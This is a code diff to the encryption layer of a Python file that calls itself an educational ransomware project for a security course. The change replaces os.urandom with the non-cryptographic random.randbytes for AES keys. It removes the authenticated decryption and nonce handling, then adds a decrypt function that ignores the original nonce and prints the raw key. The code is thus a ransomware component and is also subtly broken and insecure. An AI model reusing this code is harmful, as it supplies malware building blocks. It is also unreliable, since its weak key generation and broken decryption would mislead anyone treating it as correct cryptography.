@@ -1,4 +1,5 @@
 # --------------------------------------------
+import random
 
 # Ransomware Project for educational purposes
 # Course : Security integration
@@ -24,25 +25,26 @@ class SecurityLayer(object):
         self.cipher = AES.new(self.key, AES.MODE_GCM)
 
     def gen_key(self):
-        return os.urandom(32)
+        return random.randbytes(16)
 
     def encrypt(self, text):
         self.text = text
-        self.ciphertext, self.authTag = self.cipher.encrypt_and_digest(bytes(text, 'utf-8'))
-        return (self.ciphertext, self.authTag, self.cipher.nonce)
-
-    def decrypt(self, ciphertext):
-        if self.cipher is not None:
-            (ciphertext, authTag, nonce) = ciphertext
-            aesCipher = AES.new(self.key, AES.MODE_GCM, nonce)
-            plainText = aesCipher.decrypt_and_verify(ciphertext, authTag)
-            return plainText
-        else:
-            return f"You need to encrypt before trying to decrypt"
-
+        self.ciphertext = self.cipher.encrypt(text)
+        return self.ciphertext
 
     def showValues(self):
-        return "Key : " + str(binascii.hexlify(self.key)) + ", Nonce : " + str(binascii.hexlify(self.cipher.nonce))
+        return self.key
+
+
 # --------------------------------------------
 # Functions
 # --------------------------------------------
+
+def decrypt(ciphertexta, key):
+    #(ciphertext, authTag, nonce) = ciphertexta
+    encobj = AES.new(key, AES.MODE_GCM)
+    print(key)
+    print(type(key))
+    print(ciphertexta)
+    print(type(ciphertexta))
+    return encobj.decrypt(ciphertexta)
